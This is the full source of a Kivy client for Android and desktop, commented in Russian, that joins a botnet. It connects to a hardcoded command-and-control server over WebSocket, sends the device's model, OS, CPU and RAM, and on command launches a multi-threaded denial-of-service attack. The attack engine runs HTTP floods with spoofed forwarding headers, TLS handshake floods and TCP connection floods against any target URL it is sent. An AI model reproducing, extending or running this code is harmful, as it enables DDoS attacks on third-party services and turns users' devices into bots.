# main.py — Kivy-клиент для Android (APK) и десктопа
# Собирается через buildozer в .apk

import asyncio
import threading
import socket
import ssl
import random
import time
import os
import sys
import json
import struct
import platform
import multiprocessing
from urllib.parse import urlparse

# ═══════════════════════════════════════════════════════════
#  АДРЕС ПАНЕЛИ
# ═══════════════════════════════════════════════════════════
C2_HOST = "zany-space-waffle-jr5r77vr547ph5pxj-8000.app.github.dev"
C2_PORT = 443
USE_SSL = True
# ═══════════════════════════════════════════════════════════

RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 3

# ---------- цвета (1:1 с панелью) ----------
BG          = (0.039, 0.055, 0.090, 1)   # #0a0e17
BG_PANEL    = (0.075, 0.102, 0.149, 1)   # #131a26
BG_CARD     = (0.051, 0.071, 0.098, 1)   # #0d1219
BORDER      = (0.118, 0.165, 0.227, 1)   # #1e2a3a
FG          = (0.878, 0.902, 0.929, 1)   # #e0e6ed
FG_DIM      = (0.420, 0.478, 0.565, 1)   # #6b7a90
ACCENT      = (0.000, 1.000, 0.667, 1)   # #00ffaa
ACCENT_BLUE = (0.000, 0.667, 1.000, 1)   # #00aaff
DANGER      = (1.000, 0.267, 0.400, 1)   # #ff4466
WARN        = (1.000, 0.800, 0.000, 1)   # #ffcc00
PURPLE      = (0.800, 0.533, 1.000, 1)   # #cc88ff

# ---------- векторные константы ----------
PATHS = ["/", "/index.html", "/api", "/api/v1", "/login", "/wp-login.php",
         "/admin", "/search", "/feed", "/sitemap.xml", "/robots.txt", "/.env"]

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]


# ═══════════════════════════════════════════════════════════
#  ДВИЖОК АТАКИ (то же что в exe-версии)
# ═══════════════════════════════════════════════════════════
def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def rand_token(n):
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(n))


def rand_path():
    return f"{random.choice(PATHS)}?{rand_token(random.randint(8, 64))}"


def rand_sni():
    return f"cdn-{rand_token(6).lower()}.com"


def build_request(method, host, path, http11=True):
    extra = ""
    body = b""
    if method in ("POST", "PUT"):
        blen = random.randint(64, 1024)
        body = rand_token(blen).encode()
        extra = f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
    ver = "HTTP/1.1" if http11 else "HTTP/1.0"
    req = (
        f"{method} {path} {ver}\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(UAS)}\r\n"
        f"Accept: */*\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Connection: {'keep-alive' if http11 else 'close'}\r\n"
        f"X-Forwarded-For: {rand_ip()}\r\n"
        f"X-Real-IP: {rand_ip()}\r\n"
        f"{extra}"
        f"\r\n"
    ).encode()
    return req + body


def build_clienthello(sni):
    sni_b = sni.encode()
    sni_entry = struct.pack(">H", len(sni_b) + 3) + b"\x00" + struct.pack(">H", len(sni_b)) + sni_b
    sni_ext = struct.pack(">H", 0x0000) + struct.pack(">H", len(sni_entry)) + sni_entry
    groups = struct.pack(">H", 0x000a) + struct.pack(">H", 12) + struct.pack(">H", 6) + b"\x00\x1d\x00\x17\x00\x18\x00\x19"
    ecpf = struct.pack(">H", 0x000b) + struct.pack(">H", 2) + b"\x01\x00"
    sig = b"".join(struct.pack(">H", x) for x in [0x0403, 0x0503, 0x0603, 0x0804, 0x0805, 0x0806])
    sigalgs = struct.pack(">H", 0x000d) + struct.pack(">H", len(sig) + 2) + struct.pack(">H", len(sig)) + sig
    sup_ver = struct.pack(">H", 0x002b) + struct.pack(">H", 3) + b"\x02\x03\x04"
    ks_data = b"\x00\x1d" + struct.pack(">H", 32) + bytes(random.randint(0, 255) for _ in range(32))
    keyshare = struct.pack(">H", 0x0033) + struct.pack(">H", len(ks_data) + 2) + struct.pack(">H", len(ks_data)) + ks_data
    ext = sni_ext + groups + ecpf + sigalgs + sup_ver + keyshare
    exts_b = struct.pack(">H", len(ext)) + ext
    ciphers = b"".join(struct.pack(">H", c) for c in [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc02c, 0xc030, 0xcca9, 0xcca8])
    ciphers_b = struct.pack(">H", len(ciphers)) + ciphers
    sid = bytes([32]) + bytes(random.randint(0, 255) for _ in range(32))
    rand = bytes(random.randint(0, 255) for _ in range(32))
    body = b"\x03\x03" + rand + sid + ciphers_b + b"\x01\x00" + exts_b
    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def connect_target(host, port, use_ssl, ctx_cache):
    try:
        s = socket.create_connection((host, port), timeout=5)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        if use_ssl:
            ctx = ctx_cache.get("ctx")
            if ctx is None:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                try:
                    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                except Exception:
                    pass
                ctx_cache["ctx"] = ctx
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(3)
        return s
    except Exception:
        return None


def http1_worker(host, port, use_ssl, stats, stop_evt, mode, ctx_cache):
    sock = None
    while not stop_evt.is_set():
        if sock is None:
            sock = connect_target(host, port, use_ssl, ctx_cache)
            if sock is None:
                stats["errors"] += 1
                time.sleep(0.02)
                continue
        try:
            buf = bytearray()
            for _ in range(5):
                m = random.choice(["POST", "PUT"]) if mode == "heavy" else random.choice(METHODS)
                buf += build_request(m, host, rand_path())
            sock.sendall(buf)
            stats["requests"] += 5
            try:
                data = sock.recv(16384)
                if data:
                    stats["bytes"] += len(data)
            except socket.timeout:
                pass
            except Exception:
                pass
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            sock = None
            stats["errors"] += 1
    if sock:
        try:
            sock.close()
        except Exception:
            pass


def http10_worker(host, port, use_ssl, stats, stop_evt, ctx_cache):
    while not stop_evt.is_set():
        s = connect_target(host, port, use_ssl, ctx_cache)
        if s is None:
            stats["errors"] += 1
            continue
        try:
            s.sendall(build_request("GET", host, rand_path(), http11=False))
            stats["requests"] += 1
            try:
                s.settimeout(1)
                data = s.recv(4096)
                if data:
                    stats["bytes"] += len(data)
            except Exception:
                pass
        except Exception:
            stats["errors"] += 1
        finally:
            try:
                s.close()
            except Exception:
                pass


def tls_worker(host, port, stats, stop_evt):
    while not stop_evt.is_set():
        s = None
        try:
            s = socket.create_connection((host, port), timeout=4)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception:
                pass
            s.sendall(build_clienthello(rand_sni()))
            stats["requests"] += 1
            try:
                s.settimeout(1.5)
                data = s.recv(4096)
                if data:
                    stats["bytes"] += len(data)
            except Exception:
                pass
        except Exception:
            stats["errors"] += 1
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass


def syn_worker(host, port, stats, stop_evt):
    try:
        resolved = socket.gethostbyname(host)
    except Exception:
        resolved = host
    while not stop_evt.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try:
                s.connect_ex((resolved, port))
            except Exception:
                pass
            stats["requests"] += 1
            try:
                s.close()
            except Exception:
                pass
        except Exception:
            stats["errors"] += 1


def universal_worker(host, port, use_ssl, stats, stop_evt, mode, vectors, ctx_cache):
    while not stop_evt.is_set():
        try:
            v = random.choice(vectors)
            if v == "http1":
                http1_worker(host, port, use_ssl, stats, stop_evt, mode, ctx_cache)
            elif v == "http10":
                http10_worker(host, port, use_ssl, stats, stop_evt, ctx_cache)
            elif v == "tls":
                tls_worker(host, port, stats, stop_evt)
            elif v == "syn":
                syn_worker(host, port, stats, stop_evt)
        except Exception:
            stats["errors"] += 1
            time.sleep(0.05)


class AttackWorker(threading.Thread):
    def __init__(self, host, port, use_ssl, mode, vectors, stats, stop_evt, ctx_cache):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.mode = mode
        self.vectors = vectors
        self.stats = stats
        self.stop_evt = stop_evt
        self.ctx_cache = ctx_cache

    def run(self):
        universal_worker(self.host, self.port, self.use_ssl, self.stats,
                         self.stop_evt, self.mode, self.vectors, self.ctx_cache)


def get_device_info():
    hostname = ""
    try:
        hostname = socket.gethostname()
    except Exception:
        pass
    if hostname.lower() in ("localhost", "127.0.0.1", ""):
        try:
            with open("/proc/sys/kernel/hostname") as f:
                h = f.read().strip()
                if h:
                    hostname = h
        except Exception:
            pass
    if hostname.lower() in ("localhost", "127.0.0.1", ""):
        hostname = os.environ.get("HOSTNAME") or os.environ.get("USER") or "android-device"

    try:
        system = platform.system() or "unknown"
        release = platform.release() or ""
        machine = platform.machine() or ""
    except Exception:
        system = release = machine = "?"

    android_model = ""
    android_version = ""
    android_sdk = ""
    android_brand = ""
    try:
        if os.path.exists("/system/build.prop"):
            with open("/system/build.prop") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("ro.product.model="):
                        android_model = line.split("=", 1)[1].strip()
                    elif line.startswith("ro.product.brand="):
                        android_brand = line.split("=", 1)[1].strip()
                    elif line.startswith("ro.build.version.release="):
                        android_version = line.split("=", 1)[1].strip()
                    elif line.startswith("ro.build.version.sdk="):
                        android_sdk = line.split("=", 1)[1].strip()
    except Exception:
        pass

    try:
        cpu = multiprocessing.cpu_count()
    except Exception:
        cpu = 0

    ram_mb = 0
    try:
        if os.path.exists("/proc/meminfo"):
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        ram_mb = int(line.split()[1]) // 1024
                        break
    except Exception:
        pass

    is_android = (
        "android" in system.lower()
        or (system.lower() == "linux" and os.path.exists("/system/build.prop"))
        or android_model != ""
    )

    if is_android:
        display_os = f"Android {android_version}" if android_version else "Android"
        if android_sdk:
            display_os += f" (SDK {android_sdk})"
        display_name = android_model or hostname
        if android_brand and android_brand.lower() not in display_name.lower():
            display_name = f"{android_brand} {display_name}".strip()
    else:
        display_os = f"{system} {release}".strip()
        display_name = hostname

    return {
        "hostname": hostname,
        "display_name": display_name,
        "os": display_os,
        "cpu": cpu,
        "ram_mb": ram_mb,
        "is_android": is_android,
        "machine": machine,
        "python": platform.python_version(),
    }


# ═══════════════════════════════════════════════════════════
#  C2-КЛИЕНТ (WebSocket)
# ═══════════════════════════════════════════════════════════
attack_state = {"workers": [], "stop_evt": None, "stats": None, "timer": None}
C2_WS = {"ws": None, "lock": threading.Lock(), "loop": None}


def send_log_async(msg, level="info"):
    with C2_WS["lock"]:
        ws = C2_WS["ws"]
        loop = C2_WS["loop"]
    if ws is None or loop is None:
        return
    try:
        asyncio.run_coroutine_threadsafe(
            ws.send_json({"cmd": "log", "level": level, "msg": msg}), loop)
    except Exception:
        pass


def run_attack(url, threads, duration, mode):
    if attack_state["timer"] and attack_state["timer"].is_alive():
        send_log_async("атака уже идёт", "warn")
        return
    try:
        target = urlparse(url)
        if not target.hostname:
            raise ValueError
    except Exception:
        send_log_async(f"плохой адрес: {url}", "error")
        return

    use_ssl = target.scheme == "https"
    port = target.port or (443 if use_ssl else 80)
    vectors = ["http1", "http10", "syn"]
    if use_ssl:
        vectors.append("tls")

    stats = {"requests": 0, "errors": 0, "bytes": 0}
    stop_evt = threading.Event()
    ctx_cache = {}
    workers = []
    for _ in range(threads):
        w = AttackWorker(target.hostname, port, use_ssl, mode, vectors, stats, stop_evt, ctx_cache)
        w.start()
        workers.append(w)

    attack_state["workers"] = workers
    attack_state["stop_evt"] = stop_evt
    attack_state["stats"] = stats
    send_log_async(f"▶ АТАКА — {target.hostname}:{port} | потоков {threads} | {duration}с", "attack")

    def timer():
        deadline = time.time() + duration
        last = time.time()
        while time.time() < deadline and not stop_evt.is_set():
            time.sleep(1)
            if time.time() - last >= 10:
                send_log_async(
                    f"  запр: {stats['requests']:,} | ош: {stats['errors']:,} | "
                    f"трафик: {stats['bytes'] / 1024 / 1024:.1f} МБ", "info")
                last = time.time()
        stop_evt.set()
        send_log_async(
            f"■ ЗАВЕРШЕНО — запр: {stats['requests']:,} | ош: {stats['errors']:,} | "
            f"трафик: {stats['bytes'] / 1024 / 1024:.2f} МБ", "ok")

    t = threading.Thread(target=timer, daemon=True)
    t.start()
    attack_state["timer"] = t


def stop_attack():
    evt = attack_state.get("stop_evt")
    if evt:
        evt.set()
        send_log_async("атака остановлена", "stop")


async def run_c2_client(host, port, use_ssl, on_status_callback=None):
    import aiohttp

    info = get_device_info()
    proto = "wss" if use_ssl else "ws"
    if port in (80, 443):
        url = f"{proto}://{host}/ws/client"
    else:
        url = f"{proto}://{host}:{port}/ws/client"

    if on_status_callback:
        on_status_callback(f"подключение...")

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                ws = await session.ws_connect(url, heartbeat=30, timeout=15)
            except Exception as e:
                if on_status_callback:
                    on_status_callback(f"ошибка: {type(e).__name__}, повтор...")
                await asyncio.sleep(RECONNECT_DELAY)
                continue

            loop = asyncio.get_running_loop()
            with C2_WS["lock"]:
                C2_WS["ws"] = ws
                C2_WS["loop"] = loop

            await ws.send_json({"cmd": "hello", **info})

            try:
                msg = await asyncio.wait_for(ws.receive_json(), timeout=10)
            except Exception:
                msg = None

            if not msg or msg.get("cmd") != "hello":
                if on_status_callback:
                    on_status_callback("неверное рукопожатие")
                try:
                    await ws.close()
                except Exception:
                    pass
                with C2_WS["lock"]:
                    C2_WS["ws"] = None
                await asyncio.sleep(RECONNECT_DELAY)
                continue

            cid = msg.get("id", "?")
            if on_status_callback:
                on_status_callback(f"подключено как устройство #{cid}")

            await ws.send_json({"cmd": "ready"})

            async def sender():
                while not ws.closed:
                    try:
                        await asyncio.sleep(HEARTBEAT_INTERVAL)
                        await ws.send_json({"cmd": "ping"})
                        s = attack_state.get("stats")
                        if s and attack_state["timer"] and attack_state["timer"].is_alive():
                            await ws.send_json({"cmd": "stats", "stats": dict(s)})
                    except Exception:
                        break

            sender_task = asyncio.create_task(sender())
            try:
                async for msg in ws:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        try:
                            data = json.loads(msg.data)
                        except Exception:
                            continue
                        c = data.get("cmd")
                        if c == "attack":
                            threading.Thread(
                                target=run_attack,
                                args=(data.get("url"), data.get("threads", 50),
                                      data.get("duration", 60), data.get("mode", "heavy")),
                                daemon=True
                            ).start()
                        elif c == "stop":
                            stop_attack()
                        elif c == "ping":
                            await ws.send_json({"cmd": "pong"})
                        elif c == "pong":
                            pass
                        elif c == "die":
                            if on_status_callback:
                                on_status_callback("отключено сервером")
                            stop_attack()
                            await ws.close()
                            return
            except Exception as e:
                if on_status_callback:
                    on_status_callback(f"потеря связи")
            finally:
                sender_task.cancel()

            with C2_WS["lock"]:
                C2_WS["ws"] = None
            try:
                await ws.close()
            except Exception:
                pass

            if on_status_callback:
                on_status_callback(f"реконнект...")
            await asyncio.sleep(RECONNECT_DELAY)


# ═══════════════════════════════════════════════════════════
#  KIVY GUI
# ═══════════════════════════════════════════════════════════
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.graphics import Color, Rectangle, RoundedRectangle, Line
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.metrics import dp


class NeonButton(Button):
    """кастомная кнопка с фоном и цветом акцента"""
    def __init__(self, text="", bg_color=ACCENT, fg_color=BG, font_size=dp(20),
                 bold=True, height=dp(56), radius=dp(8), **kwargs):
        super().__init__(text=text, **kwargs)
        self.background_normal = ""
        self.background_down = ""
        self.background_color = (0, 0, 0, 0)
        self.color = fg_color
        self.font_size = font_size
        self.bold = bold
        self.size_hint_y = None
        self.height = height
        self.bg_color = bg_color
        self.radius = radius
        with self.canvas.before:
            self._color_inst = Color(*bg_color)
            self._rect_inst = RoundedRectangle(pos=self.pos, size=self.size, radius=[radius])
        self.bind(pos=self._update_rect, size=self._update_rect)

    def _update_rect(self, *args):
        self._rect_inst.pos = self.pos
        self._rect_inst.size = self.size


class DeviceCard(BoxLayout):
    """карточка выбора устройства"""
    def __init__(self, icon, title, subtitle, extra, color, on_press=None, **kwargs):
        super().__init__(orientation="vertical", size_hint_y=None, height=dp(110),
                         padding=(dp(16), dp(14)), spacing=dp(4), **kwargs)
        self.color = color

        with self.canvas.before:
            self._border_color = Color(*BORDER)
            self._border_rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(10)])
            self._bg_color = Color(*BG_PANEL)
            self._bg_rect = RoundedRectangle(pos=(self.x + dp(2), self.y + dp(2)),
                                              size=(self.width - dp(4), self.height - dp(4)),
                                              radius=[dp(8)])
        self.bind(pos=self._update, size=self._update)
        self._on_press = on_press

        # верхняя полоска цвета
        top_row = BoxLayout(orientation="horizontal", size_hint_y=None, height=dp(30))
        icon_lbl = Label(text=icon, font_size=dp(28), color=color,
                         size_hint=(None, 1), width=dp(50), halign="center")
        icon_lbl.bind(size=lambda s, v: setattr(s, 'text_size', (v[0], None)))
        top_row.add_widget(icon_lbl)

        text_col = BoxLayout(orientation="vertical")
        title_lbl = Label(text=title, font_size=dp(18), bold=True, color=color,
                          halign="left", valign="middle")
        title_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
        text_col.add_widget(title_lbl)

        sub_lbl = Label(text=subtitle, font_size=dp(12), color=FG,
                        halign="left", valign="middle")
        sub_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
        text_col.add_widget(sub_lbl)

        extra_lbl = Label(text=extra, font_size=dp(10), color=FG_DIM,
                          halign="left", valign="middle")
        extra_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
        text_col.add_widget(extra_lbl)

        top_row.add_widget(text_col)
        self.add_widget(top_row)

        # прозрачный overlay чтобы ловить клики
        self.overlay = Button(background_normal="", background_color=(0, 0, 0, 0))
        self.overlay.bind(on_press=lambda x: self._on_press() if self._on_press else None)

    def _update(self, *args):
        self._border_rect.pos = self.pos
        self._border_rect.size = self.size
        self._bg_rect.pos = (self.x + dp(2), self.y + dp(2))
        self._bg_rect.size = (self.width - dp(4), self.height - dp(4))

    def on_touch_down(self, touch):
        if self.collide_point(*touch.pos):
            if self._on_press:
                self._on_press()
            return True
        return super().on_touch_down(touch)


class RootWidget(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.device_type = None
        self.running = False
        self.start_time = None
        self.status_text = "ожидание выбора"
        self.status_color = FG_DIM
        self.attacks_count = 0
        self.uptime_seconds = 0

        with self.canvas.before:
            Color(*BG)
            self._bg_rect = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._bg, size=self._bg)

        self.main_box = BoxLayout(orientation="vertical", padding=dp(20), spacing=dp(12),
                                   size_hint=(1, 1))
        self.add_widget(self.main_box)

        # Clock для обновления UI
        Clock.schedule_interval(self._update_ui, 0.5)

        self.show_choice_screen()

    def _bg(self, *args):
        self._bg_rect.pos = self.pos
        self._bg_rect.size = self.size

    def clear(self):
        self.main_box.clear_widgets()

    # ---------- экран 1: выбор ----------
    def show_choice_screen(self):
        self.clear()

        # шапка
        title = Label(text="🛡️ Neon C2", font_size=dp(32), bold=True,
                       color=ACCENT, size_hint_y=None, height=dp(48),
                       halign="left", valign="middle")
        title.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(title)

        sub = Label(text="клиент для подключения к панели", font_size=dp(12),
                     color=FG_DIM, size_hint_y=None, height=dp(20),
                     halign="left", valign="middle")
        sub.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(sub)

        # разделитель
        sep = Widget(size_hint_y=None, height=dp(2))
        with sep.canvas:
            Color(*BORDER)
            Rectangle(pos=sep.pos, size=sep.size)
        sep.bind(pos=lambda s, v: setattr(s.canvas.children[-1], 'pos', v),
                 size=lambda s, v: setattr(s.canvas.children[-1], 'size', v))
        self.main_box.add_widget(sep)

        instruction = Label(text="ВЫБЕРИ ТИП УСТРОЙСТВА", font_size=dp(12), bold=True,
                             color=FG_DIM, size_hint_y=None, height=dp(30),
                             halign="left", valign="middle")
        instruction.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(instruction)

        # карточки
        card_pc = DeviceCard(icon="💻", title="ПК",
                              subtitle="Windows · Linux · macOS",
                              extra="x64 / x86 · 4-16 ядер",
                              color=ACCENT_BLUE,
                              on_press=lambda: self.select_device("pc"))
        self.main_box.add_widget(card_pc)

        card_phone = DeviceCard(icon="📱", title="Телефон",
                                 subtitle="Android",
                                 extra="arm64 · 4-8 ядер",
                                 color=ACCENT,
                                 on_press=lambda: self.select_device("phone"))
        self.main_box.add_widget(card_phone)

        # растяжка
        self.main_box.add_widget(Widget())

        # футер
        footer = Label(text=f"сервер: {C2_HOST}", font_size=dp(10),
                        color=FG_DIM, size_hint_y=None, height=dp(30),
                        halign="center", valign="middle")
        footer.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(footer)

    def select_device(self, dtype):
        self.device_type = dtype
        self.show_start_screen()

    # ---------- экран 2: старт ----------
    def show_start_screen(self):
        self.clear()

        is_pc = self.device_type == "pc"
        color = ACCENT_BLUE if is_pc else ACCENT

        # шапка
        title = Label(text="🛡️ Neon C2", font_size=dp(28), bold=True,
                       color=ACCENT, size_hint_y=None, height=dp(42),
                       halign="left", valign="middle")
        title.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(title)

        # бейдж устройства
        badge = BoxLayout(size_hint_y=None, height=dp(50), padding=dp(12), spacing=dp(8))
        with badge.canvas.before:
            Color(*BG_PANEL)
            RoundedRectangle(pos=badge.pos, size=badge.size, radius=[dp(8)])
        badge.bind(pos=lambda s, v: None, size=lambda s, v: None)
        badge.add_widget(Label(text=("💻" if is_pc else "📱"), font_size=dp(24),
                                color=color, size_hint_x=None, width=dp(40)))
        badge.add_widget(Label(text=("ПК" if is_pc else "Телефон"), font_size=dp(16),
                                bold=True, color=color, halign="left", valign="middle"))
        change_btn = Button(text="сменить", font_size=dp(11),
                             background_normal="", background_color=(*BG_CARD[:3], 1),
                             color=FG_DIM, size_hint_x=None, width=dp(80))
        change_btn.bind(on_press=lambda x: self.show_choice_screen())
        badge.add_widget(change_btn)
        self.main_box.add_widget(badge)

        # инфо
        info = get_device_info()
        info_box = BoxLayout(orientation="vertical", size_hint_y=None, height=dp(140),
                              padding=dp(12), spacing=dp(4))
        with info_box.canvas.before:
            Color(*BG_CARD)
            RoundedRectangle(pos=info_box.pos, size=info_box.size, radius=[dp(8)])
        for label, value in [
            ("имя", info["display_name"][:32]),
            ("ОС", info["os"][:32]),
            ("ядра", str(info["cpu"])),
            ("ОЗУ", f"{info['ram_mb']} МБ" if info["ram_mb"] else "—"),
        ]:
            row = BoxLayout(size_hint_y=None, height=dp(22))
            lbl = Label(text=label, font_size=dp(11), color=FG_DIM,
                         size_hint_x=None, width=dp(60), halign="left", valign="middle")
            lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
            row.add_widget(lbl)
            val = Label(text=value, font_size=dp(11), color=FG,
                         halign="left", valign="middle")
            val.bind(size=lambda s, v: setattr(s, 'text_size', v))
            row.add_widget(val)
            info_box.add_widget(row)
        self.main_box.add_widget(info_box)

        # статус
        status_title = Label(text="СТАТУС", font_size=dp(11), bold=True,
                              color=FG_DIM, size_hint_y=None, height=dp(24),
                              halign="left", valign="middle")
        status_title.bind(size=lambda s, v: setattr(s, 'text_size', v))
        self.main_box.add_widget(status_title)

        status_box = BoxLayout(size_hint_y=None, height=dp(40), padding=dp(10), spacing=dp(8))
        with status_box.canvas.before:
            Color(*BG_CARD)
            RoundedRectangle(pos=status_box.pos, size=status_box.size, radius=[dp(6)])

        self.status_dot = Widget(size_hint=(None, None), size=(dp(12), dp(12)))
        with self.status_dot.canvas:
            self._dot_color = Color(*FG_DIM)
            self._dot_rect = Rectangle(pos=self.status_dot.pos, size=self.status_dot.size)
        self.status_dot.bind(pos=lambda s, v: setattr(self._dot_rect, 'pos', v),
                              size=lambda s, v: setattr(self._dot_rect, 'size', v))
        status_box.add_widget(self.status_dot)

        self.status_lbl = Label(text=self.status_text, font_size=dp(11),
                                 color=FG_DIM, halign="left", valign="middle")
        self.status_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
        status_box.add_widget(self.status_lbl)

        self.main_box.add_widget(status_box)

        # кнопка старт
        self.start_btn = NeonButton(text="⚡ ЗАПУСТИТЬ", bg_color=color, fg_color=BG,
                                     font_size=dp(20), height=dp(64))
        self.start_btn.bind(on_press=lambda x: self.on_start_click())
        self.main_box.add_widget(self.start_btn)

        # кнопка стоп
        self.stop_btn = NeonButton(text="СТОП", bg_color=BG_CARD, fg_color=DANGER,
                                    font_size=dp(14), height=dp(44))
        self.stop_btn.bind(on_press=lambda x: self.on_stop_click())
        self.main_box.add_widget(self.stop_btn)

        self.main_box.add_widget(Widget())

        # счётчики
        counters = BoxLayout(size_hint_y=None, height=dp(30), spacing=dp(10))
        self.counter_lbl = Label(text="атак: 0 | время: 0с", font_size=dp(11),
                                   color=FG_DIM, halign="center", valign="middle")
        self.counter_lbl.bind(size=lambda s, v: setattr(s, 'text_size', v))
        counters.add_widget(self.counter_lbl)
        self.main_box.add_widget(counters)

    def set_status(self, text, color=None, dot_color=None):
        def _do(dt):
            self.status_text = text
            if hasattr(self, "status_lbl"):
                self.status_lbl.text = text
                if color:
                    self.status_lbl.color = color
            if dot_color and hasattr(self, "_dot_color"):
                self._dot_color.rgba = dot_color
        Clock.schedule_once(_do, 0)

    # ---------- старт ----------
    def on_start_click(self):
        if self.running:
            return
        self.running = True
        self.start_time = time.time()
        self.set_status("запуск клиента...", WARN, WARN)

        def run():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(run_c2_client(
                    C2_HOST, C2_PORT, USE_SSL,
                    on_status_callback=lambda msg: self.set_status(msg, ACCENT, ACCENT)
                ))
            except Exception as e:
                self.set_status(f"ошибка: {e}", DANGER, DANGER)
            finally:
                self.running = False

        threading.Thread(target=run, daemon=True).start()

    def on_stop_click(self):
        if not self.running:
            return
        self.running = False
        self.set_status("остановлено", FG_DIM, FG_DIM)
        stop_attack()
        time.sleep(0.5)
        os._exit(0)

    def _update_ui(self, dt):
        if self.running and self.start_time:
            self.uptime_seconds = int(time.time() - self.start_time)
            h = self.uptime_seconds // 3600
            m = (self.uptime_seconds % 3600) // 60
            s = self.uptime_seconds % 60
            parts = []
            if h: parts.append(f"{h}ч")
            if m: parts.append(f"{m}м")
            parts.append(f"{s}с")
            uptime_str = " ".join(parts)
        else:
            uptime_str = "0с"
        if hasattr(self, "counter_lbl"):
            self.counter_lbl.text = f"атак: {self.attacks_count} | время: {uptime_str}"


class C2ClientApp(App):
    def build(self):
        Window.clearcolor = BG
        return RootWidget()


if __name__ == "__main__":
    C2ClientApp().run()